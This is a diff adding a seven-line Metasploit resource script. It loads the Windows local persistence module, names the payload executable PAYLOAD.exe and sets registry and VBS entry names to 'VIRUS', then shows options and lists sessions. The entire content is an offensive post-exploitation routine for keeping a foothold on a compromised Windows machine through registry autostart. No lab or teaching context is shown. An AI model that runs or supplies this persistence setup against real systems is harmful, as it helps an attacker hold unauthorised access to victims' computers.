@@ -1,0 +1,7 @@
+use exploit/windows/local/persistence
+show options
+set EXE_NAME PAYLOAD.exe
+set REG_NAME VIRUS
+set VBS_NAME VIRUS
+show options
+sessions
